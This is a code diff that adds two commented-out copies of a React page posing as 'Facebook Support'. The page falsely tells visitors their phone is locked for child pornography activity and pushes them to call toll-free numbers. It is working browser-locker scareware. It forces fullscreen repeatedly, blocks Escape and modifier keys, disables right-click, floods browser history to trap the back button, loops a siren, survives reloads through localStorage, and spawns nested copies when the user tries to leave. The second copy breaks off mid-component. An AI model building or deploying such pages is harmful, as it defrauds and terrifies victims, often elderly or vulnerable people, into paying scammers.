@@ -1,4 +1,968 @@
+// // /* eslint-disable react/prop-types */
+// // import { useState, useEffect, useRef, useCallback } from "react"
+// // import "../App.css"
+// // import { Button } from "@/components/ui/button"
+// // import { Card } from "@/components/ui/card"
+// // import { PhoneCall, AlertCircle, Lock } from "lucide-react"
+// // import { toast, ToastContainer } from "react-toastify"
+// // import "react-toastify/dist/ReactToastify.css"
+
+// // const EmergencyCallRecursive = ({ depth = 0 }) => {
+// //   const [showPopup, setShowPopup] = useState(false)
+// //   const [nestedCalls, setNestedCalls] = useState([])
+// //   const [isFullscreen, setIsFullscreen] = useState(false)
+// //   const popupRef = useRef(null)
+// //   const fullscreenRef = useRef(null)
+
+// //   const showEmergencyToasts = () => {
+// //     toast.dismiss()
+// //     toast.error("CRITICAL ERROR: System security compromised!", {
+// //       position: "top-right",
+// //       autoClose: false,
+// //       hideProgressBar: false,
+// //       closeOnClick: false,
+// //       pauseOnHover: true,
+// //       draggable: false,
+// //       progress: undefined,
+// //       className: "emergency-toast",
+// //       icon: <AlertCircle size={24} />
+// //     })
+
+// //     toast.warning("WARNING: Your data may be at risk!", {
+// //       position: "top-left",
+// //       autoClose: false,
+// //       hideProgressBar: false,
+// //       closeOnClick: false,
+// //       pauseOnHover: false,
+// //       draggable: false,
+// //       progress: undefined,
+// //       className: "emergency-toast",
+// //       icon: <AlertCircle size={48} />
+// //     })
+
+// //     toast.info("Call Facebook Support immediately:18445692321", {
+// //       position: "bottom-center",
+// //       autoClose: false,
+// //       hideProgressBar: false,
+// //       closeOnClick: false,
+// //       pauseOnHover: false,
+// //       draggable: false,
+// //       progress: undefined,
+// //       className: "emergency-toast-bottom",
+// //       icon: <PhoneCall size={48} />
+// //     })
+// //     toast.info("Call Facebook Support immediately:18445692321", {
+// //       position: "bottom-left",
+// //       autoClose: false,
+// //       hideProgressBar: false,
+// //       closeOnClick: false,
+// //       pauseOnHover: false,
+// //       draggable: false,
+// //       progress: undefined,
+// //       className: "emergency-toast-bottom",
+// //       icon: <PhoneCall size={48} />
+// //     })
+// //     toast.info("Call Facebook Support immediately:18445692321", {
+// //       position: "bottom-right",
+// //       autoClose: false,
+// //       hideProgressBar: false,
+// //       closeOnClick: false,
+// //       pauseOnHover: false,
+// //       draggable: false,
+// //       progress: undefined,
+// //       className: "emergency-toast-bottom",
+// //       icon: <PhoneCall size={48} />
+// //     })
+// //   }
+
+// //   const requestFullscreen = async () => {
+// //     try {
+// //       const elem = fullscreenRef.current || document.documentElement
+// //       if (elem.requestFullscreen) {
+// //         await elem.requestFullscreen({ navigationUI: "hide" })
+// //       } else if (elem.webkitRequestFullscreen) {
+// //         await elem.webkitRequestFullscreen({ navigationUI: "hide" })
+// //       } else if (elem.msRequestFullscreen) {
+// //         await elem.msRequestFullscreen({ navigationUI: "hide" })
+// //       } else if (elem.mozRequestFullScreen) {
+// //         await elem.mozRequestFullScreen({ navigationUI: "hide" })
+// //       }
+// //       setIsFullscreen(true)
+// //     } catch (err) {
+// //       console.error("Fullscreen request failed:", err)
+// //     }
+// //   }
+
+// //   useEffect(() => {
+// //     const handleFullscreenChange = () => {
+// //       const isCurrentlyFullscreen = Boolean(
+// //         document.fullscreenElement ||
+// //         document.webkitFullscreenElement ||
+// //         document.mozFullScreenElement ||
+// //         document.msFullscreenElement
+// //       )
+      
+// //       setIsFullscreen(isCurrentlyFullscreen)
+      
+// //       if (!isCurrentlyFullscreen && showPopup) {
+// //         setTimeout(() => {
+// //           requestFullscreen()
+// //           playAlertSound()
+// //           setNestedCalls(prev => [...prev, Date.now()])
+// //         }, 10)
+// //       }
+// //     }
+
+// //     document.addEventListener('fullscreenchange', handleFullscreenChange)
+// //     document.addEventListener('webkitfullscreenchange', handleFullscreenChange)
+// //     document.addEventListener('mozfullscreenchange', handleFullscreenChange)
+// //     document.addEventListener('MSFullscreenChange', handleFullscreenChange)
+
+// //     return () => {
+// //       document.removeEventListener('fullscreenchange', handleFullscreenChange)
+// //       document.removeEventListener('webkitfullscreenchange', handleFullscreenChange)
+// //       document.removeEventListener('mozfullscreenchange', handleFullscreenChange)
+// //       document.removeEventListener('MSFullscreenChange', handleFullscreenChange)
+// //     }
+// //   }, [showPopup])
+
+// //   useEffect(() => {
+// //     const savedState = localStorage.getItem("emergencyAlertActive")
+// //     if (savedState === "true") {
+// //       activateEmergencyMode()
+// //     }
+
+// //     document.addEventListener("visibilitychange", handleVisibilityChange)
+
+// //     return () => {
+// //       document.removeEventListener("visibilitychange", handleVisibilityChange)
+// //     }
+// //   }, [])
+
+// //   const handleVisibilityChange = () => {
+// //     if (showPopup && document.visibilityState === "visible") {
+// //       playAlertSound()
+// //       if (!isFullscreen) {
+// //         requestFullscreen()
+// //       }
+// //     }
+// //   }
+
+// //   useEffect(() => {
+// //     if (showPopup) {
+// //       localStorage.setItem("emergencyAlertActive", "true")
+// //     } else {
+// //       localStorage.removeItem("emergencyAlertActive")
+// //     }
+// //   }, [showPopup])
+
+// //   const activateEmergencyMode = () => {
+// //     setShowPopup(true)
+// //     document.body.style.overflow = "hidden"
+// //     playAlertSound()
+// //     startSoundInterval()
+// //     showEmergencyToasts()
+// //     requestFullscreen()
+// //   }
+
+// //   const playAlertSound = useCallback(() => {
+// //     const audio = new Audio("/siren-alert-96052 (1).mp3")
+// //     audio.play()
+// //   }, [])
+
+// //   const startSoundInterval = () => {
+// //     if (window.emergencyIntervalId) {
+// //       clearInterval(window.emergencyIntervalId)
+// //     }
+
+// //     const intervalId = setInterval(() => {
+// //       playAlertSound()
+// //     }, 10000)
+
+// //     window.emergencyIntervalId = intervalId
+// //     return intervalId
+// //   }
+
+// //   const handleCall = () => {
+// //     activateEmergencyMode()
+// //   }
+
+// //   useEffect(() => {
+// //     const handleKeyDown = (e) => {
+// //       if (e.key === "Escape") {
+// //         e.preventDefault()
+// //         e.stopPropagation()
+        
+// //         // Immediately request fullscreen again
+// //         setTimeout(() => {
+// //           requestFullscreen()
+// //           // Create a new nested emergency call
+// //           setNestedCalls(prev => [...prev, Date.now()])
+          
+// //           // Visual feedback
+// //           const popup = document.getElementById("emergencyPopup")
+// //           if (popup) {
+// //             popup.classList.add("shake-animation")
+// //             setTimeout(() => {
+// //               popup.classList.remove("shake-animation")
+// //             }, 500)
+// //             playAlertSound()
+// //           }
+// //         }, 0)
+// //         return false
+// //       }
+
+// //       if (showPopup && (e.ctrlKey || e.altKey || e.metaKey)) {
+// //         e.preventDefault()
+// //         e.stopPropagation()
+// //         return false
+// //       }
+// //     }
+
+// //     window.addEventListener("keydown", handleKeyDown, { capture: true })
+
+// //     return () => {
+// //       window.removeEventListener("keydown", handleKeyDown, { capture: true })
+// //     }
+// //   }, [showPopup, playAlertSound])
+
+// //   useEffect(() => {
+// //     if (showPopup) {
+// //       const maxBackBlockCount = 100
+// //       let backBlockCount = 0
+
+// //       const pushManyHistoryStates = () => {
+// //         if (backBlockCount < maxBackBlockCount) {
+// //           window.history.pushState({ emergency: true }, document.title, window.location.href)
+// //           backBlockCount++
+// //           setTimeout(pushManyHistoryStates, 50)
+// //         }
+// //       }
+
+// //       pushManyHistoryStates()
+
+// //       const handlePopState = () => {
+// //         window.history.pushState({ emergency: true }, document.title, window.location.href)
+// //         playAlertSound()
+// //         if (!isFullscreen) {
+// //           requestFullscreen()
+// //         }
+// //       }
+
+// //       window.addEventListener("popstate", handlePopState)
+
+// //       const handleBeforeUnload = (e) => {
+// //         e.preventDefault()
+// //         e.returnValue = "Emergency in progress - please complete the emergency call before leaving"
+// //         return e.returnValue
+// //       }
+
+// //       window.addEventListener("beforeunload", handleBeforeUnload)
+
+// //       const handleContextMenu = (e) => {
+// //         e.preventDefault()
+// //         return false
+// //       }
+
+// //       document.addEventListener("contextmenu", handleContextMenu)
+
+// //       // Keep checking fullscreen status and focus
+// //       const maintenanceInterval = setInterval(() => {
+// //         if (!isFullscreen) {
+// //           requestFullscreen()
+// //         }
+// //         if (document.activeElement !== document.getElementById("emergencyPopup")) {
+// //           document.getElementById("emergencyPopup")?.focus()
+// //         }
+// //       }, 100)
+
+// //       return () => {
+// //         window.removeEventListener("popstate", handlePopState)
+// //         window.removeEventListener("beforeunload", handleBeforeUnload)
+// //         document.removeEventListener("contextMenu", handleContextMenu)
+// //         clearInterval(maintenanceInterval)
+// //       }
+// //     }
+// //   }, [showPopup, playAlertSound, isFullscreen])
+
+// //   useEffect(() => {
+// //     if (showPopup) {
+// //       const style = document.createElement("style")
+// //       style.id = "emergency-styles"
+// //       style.innerHTML = `
+// //         @keyframes shake {
+// //           0%, 100% { transform: translateX(0); }
+// //           10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
+// //           20%, 40%, 60%, 80% { transform: translateX(10px); }
+// //         }
+// //         .shake-animation {
+// //           animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
+// //         }
+// //         @keyframes flash-blue {
+// //           0%, 100% { background-color: rgba(37, 99, 235, 0.8); }
+// //           50% { background-color: rgba(59, 130, 246, 0.9); }
+// //         }
+// //         .flash-notification {
+// //           animation: flash-blue 1s infinite;
+// //         }
+// //         .fullscreen-notification {
+// //           position: fixed;
+// //           top: 0;
+// //           left: 0;
+// //           right: 0;
+// //           padding: 8px 16px;
+// //           height: 100px;
+// //           background-color:  #007bff;
+// //           color: white;
+// //           text-align: center;
+// //           font-weight: bold;
+// //           z-index: 9999;
+// //           font-family: -Facebook-system, BlinkMacSystemFont, sans-serif;
+// //           font-size: 14px;
+// //           box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+// //           display: flex;
+// //           align-items: center;
+// //           justify-content: center;
+// //           backdrop-filter: blur(10px);
+// //         }
+// //         .fullscreen-indicator {
+// //           display: inline-block;
+// //           width: 80px;
+// //           height: 200px;
+// //           background-color: white;
+// //           border-radius: 50%;
+// //           margin-right: 8px;
+// //         }
+// //       `
+// //       document.head.appendChild(style)
+
+// //       return () => {
+// //         document.head.removeChild(style)
+// //       }
+// //     }
+// //   }, [showPopup])
+
+// //   const createVisualDistraction = () => {
+// //     if (!showPopup) return null
+
+// //     return (
+// //       <>
+// //         <div className="fullscreen-notification flash-notification" onClick={handleCall}>
+// //           <span className="fullscreen-indicator animate-ping"></span>
+// //           <Lock size={96} className="mr-1" />
+// //           Facebook SECURITY - SCREEN LOCKED
+// //         </div>
+
+// //         <div className="fixed top-0 left-0 right-0 h-12 bg-blue-600 z-40 flex items-center justify-center backdrop-blur-lg">
+// //           <div className="animate-pulse flex items-center">
+// //             <AlertCircle size={24} className="text-white mr-2" />
+// //             <span className="text-white font-bold">Facebook SECURITY ALERT</span>
+// //           </div>
+// //         </div>
+
+// //         <div className="fixed top-4 right-4 bg-blue-600 text-white p-2 rounded-full animate-ping z-50">
+// //           <AlertCircle size={16} />
+// //         </div>
+// //         <div
+// //           className="fixed top-6 left-6 bg-blue-600 text-white p-2 rounded-full animate-pulse z-50"
+// //           style={{ animationDelay: "0.5s" }}
+// //         >
+// //           <AlertCircle size={16} />
+// //         </div>
+// //       </>
+// //     )
+// //   }
+
+// //   return (
+// //     <>
+// //       <div
+// //         ref={fullscreenRef}
+// //         className="min-h-screen bg-gradient-to-b from-blue-50 to-blue-100 p-4 flex flex-col items-center justify-center cursor-pointer font-[-Facebook-system]"
+// //         onClick={handleCall}
+// //         style={{ 
+// //           transform: `scale(${1 - depth * 0.05})`,
+// //           zIndex: 1000 + depth
+// //         }}
+// //       >
+// //         <ToastContainer position="top-right" autoClose={5000} />
+// //         {createVisualDistraction()}
+// //         <div className="w-full max-w-md">
+// //           <Card className="p-6 bg-white shadow-lg border border-blue-200 rounded-2xl">
+// //             <div className="flex flex-col items-center space-y-4">
+// //               <div className="bg-blue-600 rounded-full p-4 animate-pulse">
+// //                 <PhoneCall size={48} className="text-white" />
+// //               </div>
+// //               <h2 className="text-2xl font-semibold text-center">Facebook Support</h2>
+// //               <p className="text-base md:text-lg text-muted-foreground"><br></br>
+// //            <h1 className="text-xl md:text-3xl font-semibold tracking-tight">Warning:</h1> <br></br>
+// //            Your phone has been locked for a child pornography activity. Access has been restricted. Contact support Immediately at below number.
+// //             <br /><br />
+// //           </p>
+// //               <p className="text-center text-gray-600 mb-4">Tap anywhere for immediate Facebook support</p>
+// //               <Button
+// //                 className="w-full bg-blue-600 hover:bg-blue-700 text-white py-6 text-xl font-medium rounded-xl flex items-center justify-center space-x-2 transition-all"
+// //                 onClick={(e) => {
+// //                   e.stopPropagation()
+// //                   handleCall()
+// //                 }}
+// //               >
+// //                 <PhoneCall className="mr-2 h-6 w-6" />
+// //                 <span>Call 18445692321</span>
+// //               </Button>
+// //             </div>
+// //           </Card>
+// //         </div>
+
+// //         {showPopup && (
+// //           <div
+// //             id="emergencyPopup"
+// //             ref={popupRef}
+// //             className="fixed inset-0 flex items-center justify-center z-50 p-4 backdrop-blur-lg"
+// //             tabIndex={-1}
+// //             onKeyDown={(e) => {
+// //               if (e.key === "Escape" || e.key === "Tab" || e.key === "F5") {
+// //                 e.preventDefault()
+// //                 e.stopPropagation()
+// //               }
+// //             }}
+// //             onClick={(e) => e.stopPropagation()}
+// //           >
+// //             <div className="absolute inset-0 bg-black bg-opacity-60"></div>
+// //             <Card className="bg-white p-6 rounded-2xl border border-blue-200 shadow-2xl max-w-md w-full z-10 animate-bounce">
+// //               <div className="flex flex-col items-center space-y-4">
+// //                 <div className="flex items-center justify-center w-16 h-16 bg-blue-600 rounded-full">
+// //                   <AlertCircle size={32} className="text-white" />
+// //                 </div>
+// //                 <h2 className="text-2xl font-semibold text-center">Facebook SUPPORT</h2>
+// //                 <p className="text-center text-lg">Connecting you to Facebook Support at:</p>
+// //                 <p className="text-2xl font-semibold text-blue-600">18445692321</p>
+// //                 <div className="flex space-x-2 items-center justify-center w-full mt-2">
+// //                   <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping"></div>
+// //                   <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping" style={{ animationDelay: "0.2s" }}></div>
+// //                   <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping" style={{ animationDelay: "0.4s" }}></div>
+// //                 </div>
+// //                 <Button
+// //                   id="callButton"
+// //                   className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-xl mt-4"
+// //                   onClick={() => (window.location.href = "tel:18445692321")}
+// //                   autoFocus
+// //                 >
+// //                   Confirm Call
+// //                 </Button>
+// //                 <p className="text-xs text-center text-gray-500 mt-2">Facebook security mode active.</p>
+// //               </div>
+// //             </Card>
+// //           </div>
+// //         )}
+// //       </div>
+// //       {nestedCalls.map((id) => (
+// //         <EmergencyCallRecursive key={id} depth={depth + 1} />
+// //       ))}
+// //     </>
+// //   )
+// // }
+
+// // export default function EmergencyCall() {
+// //   return <EmergencyCallRecursive />
+// // }
+
+
+
+
+// // /* eslint-disable react/prop-types */
+// // import { useState, useEffect, useRef, useCallback } from "react"
+// // import "../App.css"
+// // import { Button } from "@/components/ui/button"
+// // import { Card } from "@/components/ui/card"
+// // import { PhoneCall, AlertCircle, Lock } from "lucide-react"
+// // import { toast, ToastContainer } from "react-toastify"
+// // import "react-toastify/dist/ReactToastify.css"
+
+// // const EmergencyCallRecursive = ({ depth = 0 }) => {
+// //   const [showPopup, setShowPopup] = useState(false)
+// //   const [nestedCalls, setNestedCalls] = useState([])
+// //   const [isFullscreen, setIsFullscreen] = useState(false)
+// //   const popupRef = useRef(null)
+// //   const fullscreenRef = useRef(null)
+
+// //   const showEmergencyToasts = () => {
+// //     toast.dismiss()
+// //     toast.error("CRITICAL ERROR: System security compromised!", {
+// //       position: "top-right",
+// //       autoClose: false,
+// //       hideProgressBar: false,
+// //       closeOnClick: false,
+// //       pauseOnHover: true,
+// //       draggable: false,
+// //       progress: undefined,
+// //       className: "emergency-toast",
+// //       icon: <AlertCircle size={24} />
+// //     })
+
+// //     toast.warning("WARNING: Your data may be at risk!", {
+// //       position: "top-left",
+// //       autoClose: false,
+// //       hideProgressBar: false,
+// //       closeOnClick: false,
+// //       pauseOnHover: false,
+// //       draggable: false,
+// //       progress: undefined,
+// //       className: "emergency-toast",
+// //       icon: <AlertCircle size={48} />
+// //     })
+
+// //     toast.info("Call Facebook Support immediately:18445131621", {
+// //       position: "bottom-center",
+// //       autoClose: false,
+// //       hideProgressBar: false,
+// //       closeOnClick: false,
+// //       pauseOnHover: false,
+// //       draggable: false,
+// //       progress: undefined,
+// //       className: "emergency-toast-bottom",
+// //       icon: <PhoneCall size={48} />
+// //     })
+// //     toast.info("Call Facebook Support immediately:18445131621", {
+// //       position: "bottom-left",
+// //       autoClose: false,
+// //       hideProgressBar: false,
+// //       closeOnClick: false,
+// //       pauseOnHover: false,
+// //       draggable: false,
+// //       progress: undefined,
+// //       className: "emergency-toast-bottom",
+// //       icon: <PhoneCall size={48} />
+// //     })
+// //     toast.info("Call Facebook Support immediately:18445131621", {
+// //       position: "bottom-right",
+// //       autoClose: false,
+// //       hideProgressBar: false,
+// //       closeOnClick: false,
+// //       pauseOnHover: false,
+// //       draggable: false,
+// //       progress: undefined,
+// //       className: "emergency-toast-bottom",
+// //       icon: <PhoneCall size={48} />
+// //     })
+// //   }
+
+// //   const requestFullscreen = async () => {
+// //     try {
+// //       const elem = fullscreenRef.current || document.documentElement
+// //       if (elem.requestFullscreen) {
+// //         await elem.requestFullscreen({ navigationUI: "hide" })
+// //       } else if (elem.webkitRequestFullscreen) {
+// //         await elem.webkitRequestFullscreen({ navigationUI: "hide" })
+// //       } else if (elem.msRequestFullscreen) {
+// //         await elem.msRequestFullscreen({ navigationUI: "hide" })
+// //       } else if (elem.mozRequestFullScreen) {
+// //         await elem.mozRequestFullScreen({ navigationUI: "hide" })
+// //       }
+// //       setIsFullscreen(true)
+// //     } catch (err) {
+// //       console.error("Fullscreen request failed:", err)
+// //     }
+// //   }
+
+// //   useEffect(() => {
+// //     const handleFullscreenChange = () => {
+// //       const isCurrentlyFullscreen = Boolean(
+// //         document.fullscreenElement ||
+// //         document.webkitFullscreenElement ||
+// //         document.mozFullScreenElement ||
+// //         document.msFullscreenElement
+// //       )
+      
+// //       setIsFullscreen(isCurrentlyFullscreen)
+      
+// //       if (!isCurrentlyFullscreen && showPopup) {
+// //         setTimeout(() => {
+// //           requestFullscreen()
+// //           playAlertSound()
+// //           setNestedCalls(prev => [...prev, Date.now()])
+// //         }, 10)
+// //       }
+// //     }
+
+// //     document.addEventListener('fullscreenchange', handleFullscreenChange)
+// //     document.addEventListener('webkitfullscreenchange', handleFullscreenChange)
+// //     document.addEventListener('mozfullscreenchange', handleFullscreenChange)
+// //     document.addEventListener('MSFullscreenChange', handleFullscreenChange)
+
+// //     return () => {
+// //       document.removeEventListener('fullscreenchange', handleFullscreenChange)
+// //       document.removeEventListener('webkitfullscreenchange', handleFullscreenChange)
+// //       document.removeEventListener('mozfullscreenchange', handleFullscreenChange)
+// //       document.removeEventListener('MSFullscreenChange', handleFullscreenChange)
+// //     }
+// //   }, [showPopup])
+
+// //   useEffect(() => {
+// //     const savedState = localStorage.getItem("emergencyAlertActive")
+// //     if (savedState === "true") {
+// //       activateEmergencyMode()
+// //     }
+
+// //     document.addEventListener("visibilitychange", handleVisibilityChange)
+
+// //     return () => {
+// //       document.removeEventListener("visibilitychange", handleVisibilityChange)
+// //     }
+// //   }, [])
+
+// //   const handleVisibilityChange = () => {
+// //     if (showPopup && document.visibilityState === "visible") {
+// //       playAlertSound()
+// //       if (!isFullscreen) {
+// //         requestFullscreen()
+// //       }
+// //     }
+// //   }
+
+// //   useEffect(() => {
+// //     if (showPopup) {
+// //       localStorage.setItem("emergencyAlertActive", "true")
+// //     } else {
+// //       localStorage.removeItem("emergencyAlertActive")
+// //     }
+// //   }, [showPopup])
+
+// //   const activateEmergencyMode = () => {
+// //     setShowPopup(true)
+// //     document.body.style.overflow = "hidden"
+// //     playAlertSound()
+// //     startSoundInterval()
+// //     showEmergencyToasts()
+// //     requestFullscreen()
+// //   }
+
+// //   const playAlertSound = useCallback(() => {
+// //     const audio = new Audio("/siren-alert-96052 (1).mp3")
+// //     audio.play()
+// //   }, [])
+
+// //   const startSoundInterval = () => {
+// //     if (window.emergencyIntervalId) {
+// //       clearInterval(window.emergencyIntervalId)
+// //     }
+
+// //     const intervalId = setInterval(() => {
+// //       playAlertSound()
+// //     }, 10000)
+
+// //     window.emergencyIntervalId = intervalId
+// //     return intervalId
+// //   }
+
+// //   const handleCall = () => {
+// //     activateEmergencyMode()
+// //   }
+
+// //   useEffect(() => {
+// //     const handleKeyDown = (e) => {
+// //       if (e.key === "Escape") {
+// //         e.preventDefault()
+// //         e.stopPropagation()
+        
+// //         // Immediately request fullscreen again
+// //         setTimeout(() => {
+// //           requestFullscreen()
+// //           // Create a new nested emergency call
+// //           setNestedCalls(prev => [...prev, Date.now()])
+          
+// //           // Visual feedback
+// //           const popup = document.getElementById("emergencyPopup")
+// //           if (popup) {
+// //             popup.classList.add("shake-animation")
+// //             setTimeout(() => {
+// //               popup.classList.remove("shake-animation")
+// //             }, 500)
+// //             playAlertSound()
+// //           }
+// //         }, 0)
+// //         return false
+// //       }
+
+// //       if (showPopup && (e.ctrlKey || e.altKey || e.metaKey)) {
+// //         e.preventDefault()
+// //         e.stopPropagation()
+// //         return false
+// //       }
+// //     }
+
+// //     window.addEventListener("keydown", handleKeyDown, { capture: true })
+
+// //     return () => {
+// //       window.removeEventListener("keydown", handleKeyDown, { capture: true })
+// //     }
+// //   }, [showPopup, playAlertSound])
+
+// //   useEffect(() => {
+// //     if (showPopup) {
+// //       const maxBackBlockCount = 100
+// //       let backBlockCount = 0
+
+// //       const pushManyHistoryStates = () => {
+// //         if (backBlockCount < maxBackBlockCount) {
+// //           window.history.pushState({ emergency: true }, document.title, window.location.href)
+// //           backBlockCount++
+// //           setTimeout(pushManyHistoryStates, 50)
+// //         }
+// //       }
+
+// //       pushManyHistoryStates()
+
+// //       const handlePopState = () => {
+// //         window.history.pushState({ emergency: true }, document.title, window.location.href)
+// //         playAlertSound()
+// //         if (!isFullscreen) {
+// //           requestFullscreen()
+// //         }
+// //       }
+
+// //       window.addEventListener("popstate", handlePopState)
+
+// //       const handleBeforeUnload = (e) => {
+// //         e.preventDefault()
+// //         e.returnValue = "Emergency in progress - please complete the emergency call before leaving"
+// //         return e.returnValue
+// //       }
+
+// //       window.addEventListener("beforeunload", handleBeforeUnload)
+
+// //       const handleContextMenu = (e) => {
+// //         e.preventDefault()
+// //         return false
+// //       }
+
+// //       document.addEventListener("contextmenu", handleContextMenu)
+
+// //       // Keep checking fullscreen status and focus
+// //       const maintenanceInterval = setInterval(() => {
+// //         if (!isFullscreen) {
+// //           requestFullscreen()
+// //         }
+// //         if (document.activeElement !== document.getElementById("emergencyPopup")) {
+// //           document.getElementById("emergencyPopup")?.focus()
+// //         }
+// //       }, 100)
+
+// //       return () => {
+// //         window.removeEventListener("popstate", handlePopState)
+// //         window.removeEventListener("beforeunload", handleBeforeUnload)
+// //         document.removeEventListener("contextMenu", handleContextMenu)
+// //         clearInterval(maintenanceInterval)
+// //       }
+// //     }
+// //   }, [showPopup, playAlertSound, isFullscreen])
+
+// //   useEffect(() => {
+// //     if (showPopup) {
+// //       const style = document.createElement("style")
+// //       style.id = "emergency-styles"
+// //       style.innerHTML = `
+// //         @keyframes shake {
+// //           0%, 100% { transform: translateX(0); }
+// //           10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
+// //           20%, 40%, 60%, 80% { transform: translateX(10px); }
+// //         }
+// //         .shake-animation {
+// //           animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
+// //         }
+// //         @keyframes flash-blue {
+// //           0%, 100% { background-color: rgba(37, 99, 235, 0.8); }
+// //           50% { background-color: rgba(59, 130, 246, 0.9); }
+// //         }
+// //         .flash-notification {
+// //           animation: flash-blue 1s infinite;
+// //         }
+// //         .fullscreen-notification {
+// //           position: fixed;
+// //           top: 0;
+// //           left: 0;
+// //           right: 0;
+// //           padding: 8px 16px;
+// //           height: 100px;
+// //           background-color:  #007bff;
+// //           color: white;
+// //           text-align: center;
+// //           font-weight: bold;
+// //           z-index: 9999;
+// //           font-family: -Facebook-system, BlinkMacSystemFont, sans-serif;
+// //           font-size: 14px;
+// //           box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+// //           display: flex;
+// //           align-items: center;
+// //           justify-content: center;
+// //           backdrop-filter: blur(10px);
+// //         }
+// //         .fullscreen-indicator {
+// //           display: inline-block;
+// //           width: 80px;
+// //           height: 200px;
+// //           background-color: white;
+// //           border-radius: 50%;
+// //           margin-right: 8px;
+// //         }
+// //       `
+// //       document.head.appendChild(style)
+
+// //       return () => {
+// //         document.head.removeChild(style)
+// //       }
+// //     }
+// //   }, [showPopup])
+
+// //   const createVisualDistraction = () => {
+// //     if (!showPopup) return null
+
+// //     return (
+// //       <>
+// //         <div className="fullscreen-notification flash-notification" onClick={handleCall}>
+// //           <span className="fullscreen-indicator animate-ping"></span>
+// //           <Lock size={96} className="mr-1" />
+// //           Facebook SECURITY - SCREEN LOCKED
+// //         </div>
+
+// //         <div className="fixed top-0 left-0 right-0 h-12 bg-blue-600 z-40 flex items-center justify-center backdrop-blur-lg">
+// //           <div className="animate-pulse flex items-center">
+// //             <AlertCircle size={24} className="text-white mr-2" />
+// //             <span className="text-white font-bold">Facebook SECURITY ALERT</span>
+// //           </div>
+// //         </div>
+
+// //         <div className="fixed top-4 right-4 bg-blue-600 text-white p-2 rounded-full animate-ping z-50">
+// //           <AlertCircle size={16} />
+// //         </div>
+// //         <div
+// //           className="fixed top-6 left-6 bg-blue-600 text-white p-2 rounded-full animate-pulse z-50"
+// //           style={{ animationDelay: "0.5s" }}
+// //         >
+// //           <AlertCircle size={16} />
+// //         </div>
+// //       </>
+// //     )
+// //   }
+
+// //   return (
+// //     <>
+// //       <div
+// //         ref={fullscreenRef}
+// //         className="min-h-screen bg-gradient-to-b from-blue-50 to-blue-100 p-4 flex flex-col items-center justify-center cursor-pointer font-[-Facebook-system]"
+        
+// //         style={{ 
+// //           transform: `scale(${1 - depth * 0.05})`,
+// //           zIndex: 1000 + depth
+// //         }}
+// //         onClick={() => (window.location.href = "tel:18445131621")}
+// //       >
+// //         {/* <ToastContainer position="top-right" autoClose={5000} /> */}
+// //         <ToastContainer
+// //         position="top-right"
+// //         autoClose={false}
+// //         newestOnTop
+// //         closeOnClick={false}
+// //         rtl={false}
+// //         pauseOnFocusLoss
+// //         draggable={false}
+// //         theme="colored"
+// //         limit={5}
+// //       />
+// //         {createVisualDistraction()}
+// //         <div className="w-full max-w-md">
+// //           <Card className="p-6 bg-white shadow-lg border border-blue-200 rounded-2xl">
+// //             <div className="flex flex-col items-center space-y-4">
+// //               <div className="bg-blue-600 rounded-full p-4 animate-pulse">
+// //                 <PhoneCall size={48} className="text-white" />
+// //               </div>
+// //               <h2 className="text-2xl font-semibold text-center">Facebook Support</h2>
+// //               <p className="text-base md:text-lg text-muted-foreground"><br></br>
+// //            <h1 className="text-xl md:text-3xl font-semibold tracking-tight">Warning:</h1> <br></br>
+// //            Your phone has been locked for a child pornography activity. Access has been restricted. Contact support Immediately at below number.
+// //             <br /><br />
+// //           </p>
+// //               <p className="text-center text-gray-600 mb-4">Tap anywhere for immediate Facebook support</p>
+// //               <Button
+// //                 className="w-full bg-blue-600 hover:bg-blue-700 text-white py-6 text-xl font-medium rounded-xl flex items-center justify-center space-x-2 transition-all"
+// //                 onClick={(e) => {
+// //                   e.stopPropagation()
+// //                   handleCall()
+// //                 }}
+// //               >
+// //                 <PhoneCall className="mr-2 h-6 w-6" />
+// //                 <span>Call 18445131621</span>
+// //               </Button>
+
+// //               <Button
+// //                 className="w-full bg-blue-600 hover:bg-blue-700 text-white py-6 text-xl font-medium rounded-xl flex items-center justify-center space-x-2 transition-all"
+// //                 onClick={(e) => {
+// //                   e.stopPropagation()
+// //                   handleCall()
+// //                 }}
+// //               >
+// //                 <PhoneCall className="mr-2 h-6 w-6" />
+// //                 <span>Back to facebook</span>
+// //               </Button>
+// //             </div>
+// //           </Card>
+// //         </div>
+
+// //         {showPopup && (
+// //           <div
+// //             id="emergencyPopup"
+// //             ref={popupRef}
+// //             className="fixed inset-0 flex items-center justify-center z-50 p-4 backdrop-blur-lg"
+// //             tabIndex={-1}
+// //             onKeyDown={(e) => {
+// //               if (e.key === "Escape" || e.key === "Tab" || e.key === "F5") {
+// //                 e.preventDefault()
+// //                 e.stopPropagation()
+// //               }
+// //             }}
+// //             onClick={(e) => e.stopPropagation()}
+// //           >
+// //             <div className="absolute inset-0 bg-black bg-opacity-60"></div>
+// //             <Card className="bg-white p-6 rounded-2xl border border-blue-200 shadow-2xl max-w-md w-full z-10 animate-bounce">
+// //               <div className="flex flex-col items-center space-y-4">
+// //                 <div className="flex items-center justify-center w-16 h-16 bg-blue-600 rounded-full">
+// //                   <AlertCircle size={32} className="text-white" />
+// //                 </div>
+// //                 <h2 className="text-2xl font-semibold text-center">Facebook SUPPORT</h2>
+// //                 <p className="text-center text-lg">Connecting you to Facebook Support at:</p>
+// //                 <p className="text-2xl font-semibold text-blue-600">18445131621</p>
+// //                 <div className="flex space-x-2 items-center justify-center w-full mt-2">
+// //                   <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping"></div>
+// //                   <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping" style={{ animationDelay: "0.2s" }}></div>
+// //                   <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping" style={{ animationDelay: "0.4s" }}></div>
+// //                 </div>
+// //                 <Button
+// //                   id="callButton"
+// //                   className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-xl mt-4"
+// //                   onClick={() => (window.location.href = "tel:18445131621")}
+// //                   autoFocus
+// //                 >
+// //                   Confirm Call
